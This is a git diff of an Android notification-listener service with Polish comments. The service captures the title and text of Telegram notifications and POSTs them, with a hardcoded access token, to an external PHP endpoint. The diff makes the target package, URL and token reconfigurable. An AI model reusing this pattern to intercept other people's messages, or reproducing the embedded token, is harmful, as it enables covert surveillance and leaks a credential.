@@ -13,9 +13,16 @@ import java.nio.charset.StandardCharsets;
 
 public class CustomNotificationListenerService extends NotificationListenerService {
 
-    private static final String TAG = "NotificationListener";
-    private static final String TELEGRAM_PACKAGE_NAME = "org.telegram.messenger"; // Nazwa pakietu aplikacji Telegram
-    private static final String POST_URL = "https://capybara.s1.zetohosting.pl/add.php";
+    private static String TAG = "NotificationListener";
+    private static String TELEGRAM_PACKAGE_NAME = "org.telegram.messenger"; // Nazwa pakietu aplikacji Telegram
+    private static String POST_URL = "https://capybara.s1.zetohosting.pl/add.php";
+    private static String TOKEN = "GPuO3vpOdl0Ox087qJulkrS0CvHpk0YEX7dzsSF028D2Rv92R41AJ6BKMwUc9y3l";
+
+    public static void updateSettings(String packageName, String postUrl, String token) {
+        TELEGRAM_PACKAGE_NAME = packageName;
+        POST_URL = postUrl;
+        TOKEN = token;
+    }
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
@@ -36,7 +43,7 @@ public class CustomNotificationListenerService extends NotificationListenerServi
                 Log.i(TAG, "Treść powiadomienia: " + text);
 
                 // Wysłanie danych do endpointa POST
-                sendPostRequest(title, text, "GPuO3vpOdl0Ox087qJulkrS0CvHpk0YEX7dzsSF028D2Rv92R41AJ6BKMwUc9y3l");
+                sendPostRequest(title, text, TOKEN);
             } else {
                 Log.i(TAG, "Brak szczegółów powiadomienia");
             }
